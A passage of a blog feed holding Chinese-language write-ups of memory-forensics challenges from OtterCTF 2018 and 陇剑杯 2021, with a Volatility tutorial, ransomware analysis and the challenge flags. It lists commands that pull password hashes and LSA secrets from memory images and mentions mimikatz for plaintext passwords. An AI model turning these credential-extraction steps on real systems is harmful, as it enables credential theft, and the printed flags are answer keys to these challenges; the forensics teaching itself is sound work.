keyword">after</span> this signature<span class="token punctuation">:</span> 0x64 0x??&#123;6-8&#125; 0x40 0x06 0x??&#123;<span class="token number">18</span>&#125; 0x5a 0x0c 0x00&#123;<span class="token number">2</span>&#125;What<span class="token string">'s rick'</span>s <span class="token keyword">character</span>'s name?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:16进制, 在linux下，xxd指令可以打印文件的hexdump信息，故借此筛选特定信息的位置</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202712351.png" alt="image-20230720202712351"></p><p>1)前面我们已经导出了游戏的进程，这里我们直接查看</p><p>xxd是一个十六进制转储工具，它可以将文件或标准输入的内容转换为十六进制格式进行显示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202755214.png" alt="image-20230720202755214"></p><p>2)我们使用命令: xxd &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;708.dmp | grep “5a0c 0000”,这条命令的目的是从文件708.dmp中查找包含十六进制序列5a0c 0000的行，并将它们输出到终端。</p><p>5a0c 0000 是题目内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720203312064.png" alt="image-20230720203312064"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M0rtyL0L&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="八-OtterCTF-2018-Path-To-Glory"><a href="#八-OtterCTF-2018-Path-To-Glory" class="headerlink" title="八.[OtterCTF 2018]Path To Glory"></a>八.[OtterCTF 2018]Path To Glory</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">How did the malware got <span class="token keyword">to</span> rick's PC? It must be one <span class="token keyword">of</span> rick old illegal habits<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>恶意软件是如何到达Rick的PC的？它一定是里克旧的非法习惯之一<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:进程分析  提权进程</p><p>1)在前面我们知道恶意软件是:vmware-tray.exe，这里我们使用他的父进程3820</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191335979.png" alt="image-20230721191335979"></p><p>2)我们可以看到3820就是恶意软件，我们搜索相关的内容——filescan | “grep Rick And Morty”</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191710984.png" alt="image-20230721191710984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192154141.png" alt="image-20230721192154141"></p><p>3)我们提权相关的内容——dumpfiles  -Q   0x000000007dae9350 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192407656.png" alt="image-20230721192407656"></p><p>4)我们使用strings进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192523788.png" alt="image-20230721192523788"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">这里记得把最后的字母e去掉flag&#123;M3an_T0rren7_4_R!ck&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="九-OtterCTF-2018-Path-To-Glory-2"><a href="#九-OtterCTF-2018-Path-To-Glory-2" class="headerlink" title="九.[OtterCTF 2018]Path To Glory 2"></a>九.[OtterCTF 2018]Path To Glory 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">Continue</span> the <span class="token keyword">search</span> <span class="token keyword">after</span> the way that malware got <span class="token keyword">in</span><span class="token punctuation">.</span>在恶意软件进入的方式之后继续进行搜索。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:历史记录 history 数据库</p><p>1)我们首先查看是什么浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193231763.png" alt="image-20230721193231763"></p><p>2)谷歌浏览器，我们使用memdump -n 提取chrome信息    Memdump -n chrome.exe  -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193723492.png" alt="image-20230721193723492"></p><p>3)在chrome查看所有包含’Rick And Morty’ 的前后10行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings <span class="token operator">*</span><span class="token punctuation">.</span>dmp | grep -i <span class="token string">'Rick And Morty'</span> -C <span class="token number">10</span> 这个方法比较慢，而且还不好找<span class="token punctuation">,</span>我们可以查看这篇文章https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>petermstewart<span class="token punctuation">.</span>net<span class="token operator">/</span>otterctf-2018-memory-forensics-write-up<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194621802.png" alt="image-20230721194621802"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194550106.png" alt="image-20230721194550106"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@<span class="token keyword">in</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十-OtterCTF-2018-Bit-4-Bit"><a href="#十-OtterCTF-2018-Bit-4-Bit" class="headerlink" title="十.[OtterCTF 2018]Bit 4 Bit"></a>十.[OtterCTF 2018]Bit 4 Bit</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We<span class="token string">'ve found out that the malware is a ransomware. Find the attacker'</span>s bitcoin <span class="token keyword">address</span><span class="token punctuation">.</span>我们发现恶意软件是勒索软件。找到攻击者的比特币地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:搜索桌面文件，恶意进程</p><p>1)一般情况下，我们要是不知道在哪里查找文件，那么我们首先在桌面进行搜索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195219214.png" alt="image-20230721195219214"></p><p>2)我们可以看到2个txt文件，我们提取第一个txt文件     dumpfiles -Q 0x000000007d660500 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195403564.png" alt="image-20230721195403564"></p><p>3)我们进行查看文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195637756.png" alt="image-20230721195637756"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195705687.png" alt="image-20230721195705687"></p><p>4)提示我们查看程序获得更多信息（就是上面的vmware-tray.exe）,我们提取恶意进程 Memdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195940051.png" alt="image-20230721195940051"></p><p>5)我们使用strings进行搜索ransomware题目的提示</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings -e l <span class="token number">3720</span><span class="token punctuation">.</span>dmp | grep -i -A <span class="token number">5</span> <span class="token string">"ransomware"</span>该命令的目的是从名为 <span class="token string">"3720.dmp"</span> 的内存镜像文件中提取包含 <span class="token string">"ransomware"</span> 的字符串，并显示匹配行及其后的 <span class="token number">5</span> 行内容。这有助于在内存镜像中查找与勒索软件（ransomware）相关的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200235003.png" alt="image-20230721200235003"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十一-OtterCTF-2018-Graphic’s-For-The-Weak"><a href="#十一-OtterCTF-2018-Graphic’s-For-The-Weak" class="headerlink" title="十一.[OtterCTF 2018]Graphic’s For The Weak"></a>十一.[OtterCTF 2018]Graphic’s For The Weak</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">There<span class="token string">'s something fishy in the malware'</span>s graphics<span class="token punctuation">.</span>恶意软件的图形中有一些可疑的东西。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:procdump转存进程的可执行文件</p><p>1)前面我们知道恶意进程是3720，这里我们直接转存进程</p><p>procdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200617781.png" alt="image-20230721200617781"></p><p>2)我们使用binwalk进行分离软件,但是没有如何可用的信息，我们使用foremost</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200932160.png" alt="image-20230721200932160"></p><p>3)可以看到一个文件夹，里面有图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200807449.png" alt="image-20230721200807449"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200832448.png" alt="image-20230721200832448"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201144066.png" alt="image-20230721201144066"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;S0_Just_M0v3_Socy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十二-OtterCTF-2018-Recovery"><a href="#十二-OtterCTF-2018-Recovery" class="headerlink" title="十二.[OtterCTF 2018]Recovery"></a>十二.[OtterCTF 2018]Recovery</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick got <span class="token keyword">to</span> have his files recovered! What <span class="token keyword">is</span> the <span class="token keyword">random</span> <span class="token keyword">password</span> used <span class="token keyword">to</span> encrypt the files?里克必须恢复他的文件！用于加密文件的随机密码是什么？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 重定向文本</p><p>1)我们把上一题提取的 exe 文件放进 ida,找到一个 sendpassword 函数，用到了 computername 和 username</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201804590.png" alt="image-20230721201804590"></p><p>2)strings -e l 3720.dmp &gt; 3720.dmp.strings,该命令是将名为 “3720.dmp” 的内存镜像文件中提取的可打印字符串保存到名为 “3720.dmp.strings” 的文本文件中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201918438.png" alt="image-20230721201918438"></p><p>3)grep “WIN-LO6FAF3DTFE”  3720.dmp.strings | sort | uniq</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">该命令用于在名为 <span class="token string">"3720.dmp.strings"</span> 的文本文件中搜索包含 <span class="token string">"WIN-LO6FAF3DTFE"</span> 的行，并对结果进行排序和去重。<span class="token keyword">sort</span><span class="token punctuation">:</span> 这是一个命令行工具，用于对文本进行排序操作。uniq<span class="token punctuation">:</span> 这是一个命令行工具，用于从已排序的文本中去除重复行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202228776.png" alt="image-20230721202228776"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;aDOBofVYUNVnmp7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十三-OtterCTF-2018-Closure"><a href="#十三-OtterCTF-2018-Closure" class="headerlink" title="十三.[OtterCTF 2018]Closure"></a>十三.[OtterCTF 2018]Closure</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Now that you extracted the <span class="token keyword">password</span> <span class="token keyword">from</span> the <span class="token keyword">memory</span><span class="token punctuation">,</span> could you decrypt rick's files?现在您从内存中提取了密码，您可以解密Rick的文件吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 密程序HiddenTearDecrypter</p><p>1)解密文件,前面我们知道桌面有2个文件，其中一个就是flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202821259.png" alt="image-20230721202821259"></p><p>2)我们把flag转储下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202926497.png" alt="image-20230721202926497"></p><p>3)已知这个勒索软件为HiddenTear，直接在网上找到解密程序HiddenTearDecrypter,先将加密文件的末尾多余的0去掉，再把后缀加上locked</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202746816.png" alt="image-20230721202746816"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202753343.png" alt="image-20230721202753343"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202758918.png" alt="image-20230721202758918"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;CTF&#123;lm_Th@_B3S7_RicK_of_Th3m_4ll&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-General-Info&quot;&gt;&lt;a href=&quot;#一-General-Info&quot; class=&quot;headerlink&quot; title=&quot;一.General Info&quot;&gt;&lt;/a&gt;一.General Info&lt;/h1&gt;&lt;pre class=&quot;line-numbers </summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>陇剑杯-2021-内存分析</title>
    <link href="http://ms02423.top/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/"/>
    <id>http://ms02423.top/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</id>
    <published>2023-07-18T05:07:32.000Z</published>
    <updated>2023-07-18T12:29:22.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h1><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h1 id="二-安装Volatility"><a href="#二-安装Volatility" class="headerlink" title="二.安装Volatility"></a>二.安装Volatility</h1><p>在不同系统下都有不同的软件版本</p><p>官网地址:<a href="https://www.volatilityfoundation.org/26">https://www.volatilityfoundation.org/26</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718154641730.png" alt="image-20230718154641730"></p><p>根据自己需求下载</p><p> 另外不同的版本下，也存在着一定命令上的差异，使用时一定需注意</p><h2 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h2><p>直接下载解压就好了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155239224.png" alt="image-20230718155239224"></p><p>打开cmd 直接输入命令即可 ，cmd必须是当前目录，除非你设了环境变量</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155533144.png" alt="image-20230718155533144"></p><h2 id="2-Linux下（这里kali为例）"><a href="#2-Linux下（这里kali为例）" class="headerlink" title="2. Linux下（这里kali为例）"></a>2. Linux下（这里kali为例）</h2><p>Volatility2.6需要python2，pip安装模块也需要2版本，具体命令根据实际情况调整</p><p>源码包（这是github,比较快，也可以下上面官网的，步骤是一样的)</p><p>下载解压</p><p>unzip volatility-master.zip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155805873.png" alt="image-20230718155805873"></p><p>安装依赖环境（distorm3 crypto）</p><p>crypto</p><p> pip2 install pycryptodome</p><p>如果安装失败，可使用以下命令切换国内源</p><p>pip2 install pycryptodome -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>distorm3下载地址</p><p><a href="https://github.com/vext01/distorm3">https://github.com/vext01/distorm3</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155941796.png" alt="image-20230718155941796"></p><p>进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160013231.png" alt="image-20230718160013231"></p><p>安装Volatility</p><p>在解压后的Volatility目录下进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160048427.png" alt="image-20230718160048427"></p><p>检验</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160108793.png" alt="image-20230718160108793"></p><h1 id="三-安装插件"><a href="#三-安装插件" class="headerlink" title="三 .安装插件"></a>三 .安装插件</h1><p>安装mimikatz</p><p>将mimikatz.py复制到volatility-master&#x2F;volatility&#x2F;plugins&#x2F;目录下，使用时需要添加参数–plugins&#x3D;.&#x2F;volatility-master&#x2F;volatility&#x2F;plugins。<br>运行时可能会出现如下错误，这是因为没有安装construct 模块：</p><p><strong>Volatility Foundation Volatility Framework 2.6</strong><br>*** Failed to import volatility.plugins.mimikatz (ImportError: No module named construct)<br>ERROR   : volatility.debug    : You must specify something to do (try -h)**<br>安装construct模块<br> pip install construct</p><h1 id="四-命令格式"><a href="#四-命令格式" class="headerlink" title="四.命令格式"></a>四.命令格式</h1><p>volatility -f [image] –profile&#x3D;[profile] [plugin] </p><p>volatility -f [对象] –profile&#x3D;[操作系统] [插件参数]</p><p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统 命令imageinfo即可获取镜像信息。</p><p>Volatility -f xxx.vmem imageinfo</p><p>在查到操作系统后如果不确定可以使用以下命令查看</p><p>volatility - f xxx.vmem –profile&#x3D;[操作系统] volshell<br>举个例子 像这种什么都找不到</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160814458.png" alt="image-20230718160814458"></p><p><strong>当我们确定操作系统就可以利用插件去做题了</strong></p><h1 id="六-常用命令插件"><a href="#六-常用命令插件" class="headerlink" title="六.常用命令插件"></a>六.常用命令插件</h1><p>可以先查看当前内存镜像中的用户printkey -K  SAM\Domains\Account\Users\Names</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户名密码信息(密码是哈希值，需要john爆破) hashdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hashdump</code></pre><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)<br>如果john爆破不出来，就使用 lasdmp 查看强密码 lsadump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 lsadump</code></pre><p>查看进程 pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist</code></pre><p>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以<br>查看已知进程pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</code></pre><p>隐藏或解链的进程 psscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 psscan</code></pre><p>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程<br>查看服务 查询服务名称 svcscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 svcscan</code></pre><p>svcscan：扫描 Windows 的服务<br>查看浏览器历史记录,获取当前系统浏览器搜索过的关键词 iehistory</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 iehistory</code></pre><p>查看网络连接 获取当前系统 ip netscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 netscan</code></pre><p>有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)<br>查看网络连接 connscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 connscan</code></pre><p>connscan：查看网络连接<br>查看网络连接 connections</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 connections</code></pre><p>connections：查看网络连接<br>查看命令行操作，显示cmd历史命令 cmdscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</code></pre><p>cmdscan：可用于查看终端记录<br>查看进程命令行参数（具体一些可疑进程的参数指令) cmdline</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdline</code></pre><p>扫描所有的文件列表 filescan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 filescan</code></pre><p>（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）</p><p>例</p><pre><code>   volatility -f 1.vmem --profile=Win7SP1x64 filescan grep &quot;flag.txt&quot;</code></pre><p>cat system.txt | grep -i computername<br>查看文件内容 dumpfiles</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</code></pre><p>需要指定偏移量 -Q 和输出目录 -D</p><p>dumpfiles：导出某一文件(指定虚拟地址)<br>查看当前展示的notepad内容  notepad</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 notepad</code></pre><p>查看当前展示的 notepad 文本（–profile&#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）<br>显示有关编辑控件（曾经编辑过的内容）的信息 editbox</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 editbox</code></pre><p>editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容<br>提取进程 memdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</code></pre><p>memdump：提取出指定进程，常用foremost 来分离里面的文件  </p><p>需要指定进程-p [pid] 和输出目录 -D </p><p>memdump -p 332 -D XX&#x2F;   </p><p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p><p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p><p>strings -e l 2040.dmp | grep flag 查找flag</p><p>屏幕截图 screenshot</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</code></pre><p>screenshot：保存基于GDI窗口的伪截屏<br>查看注册表配置单元 hivelist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivelist</code></pre><p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址<br>查看注册表键名 hivedump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</code></pre><p>查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等 userassist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 userassist</code></pre><p>最大程序提取信息timeliner</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 timeliner</code></pre><p>timeliner: 将所有操作系统事件以时间线的方式展开<br>查看剪贴板信息 clipboard</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 clipboard</code></pre><p>clipboard：查看剪贴板信息<br>恢复被删除的文件 mftparser</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 mftparser</code></pre><p>mftparser：恢复被删除的文件<br>查看环境变量 envars</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 envars</code></pre><p>envars：查看环境变量<br>列出某一进程加载的所有dll文件 dlllist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</code></pre><p>dlllist: 列出某一进程加载的所有dll文件<br>程序版本信息 verinfo</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 verinfo</code></pre><p>列出PE｜程序版本信息<br>产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</code></pre><p>在进程中PPID比PID还大，那就可能这个进程有异常程序<br>从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</code></pre><h1 id="七-例题讲解"><a href="#七-例题讲解" class="headerlink" title="七.例题讲解"></a>七.例题讲解</h1><p>[陇剑杯 2021]内存分析</p><p>1.网管小王制作了一个虚拟机文件，让您来分析后作答：虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）。</p><p>1)首先确定镜像是何种操作系统的，命令imageinfo即可获取镜像信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192418198.png" alt="image-20230718192418198"></p><p>2)我们使用hashdump获取sam</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192741658.png" alt="image-20230718192741658"></p><p>3)john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192801504.png" alt="image-20230718192801504"></p><p>我们可以看到flag</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）</p><p>1)我们直接在桌面进行搜索，我们可以看到HUAWEI手机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193125512.png" alt="image-20230718193125512"></p><p>2)我们直接搜索HUAWEI</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193510157.png" alt="image-20230718193510157"></p><p>3)将第一个提取出来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193728215.png" alt="image-20230718193728215"></p><p>4)我们可以看到2个文件，我们进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193757715.png" alt="image-20230718193757715"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194316509.png" alt="image-20230718194316509"></p><p>5)解压完成后发现多了一个HUAWEI P40_2021-aa-bb xx.yy.zz文件夹，并且在里面发现一个images0.tar.enc文件，此文件为华为加密文件，我们需要在网上下载解密脚本，解压密码题目中已经提示为上一题的flag,也就是W31C0M3 T0 THiS 34SY F0R3NSiCX，注意，运行脚本时密码的空格要改为’_’也就是W31C0M3_T0_THiS_34SY_F0R3NSiCX</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194455738.png" alt="image-20230718194455738"></p><p>6)项目地址</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>RealityNet<span class="token operator">/</span>kobackupdec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：kobackupdec<span class="token operator">.</span>py <span class="token punctuation">[</span><span class="token operator">-</span>h<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> password backup_path dest_pathpassword：是用户提供的密码backup_path：是包含华为备份的文件夹，可以使用相对或绝对路径dest_path：是要在指定路径（绝对或相对）中创建的文件夹。如果提供的文件夹已存在，它将报错例如：python kobackupdec<span class="token operator">.</span>py <span class="token operator">-</span>vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="token string double-quoted-string">"/home/kali/volatility_2.6_lin64_standalone/HUAWEI P40_2021-aa-bb xx.yy.zz/picture/storage/MediaTar/images/"</span> <span class="token operator">/</span>home<span class="token operator">/</span>kali<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于我的环境有问题，所以后面我使用网上的图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201203971.png" alt="image-20230718201203971"></p><p>7)运行完后会有两个文件，打开storage</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201230377.png" alt="image-20230718201230377"></p><p>8)里面会有一个.tar压缩文件，打开后会有flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/2a86bea6dbfd4e91a3559abcc1b9b39a.png" alt="img"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;TH4NK Y0U <span class="token keyword">FOR</span> DECRYPTING MY <span class="token keyword">DATA</span>&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-简介&quot;&gt;&lt;a href=&quot;#一-简介&quot; class=&quot;headerlink&quot; title=&quot;一.简介&quot;&gt;&lt;/a&gt;一.简介&lt;/h1&gt;&lt;p&gt;Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
</feed>
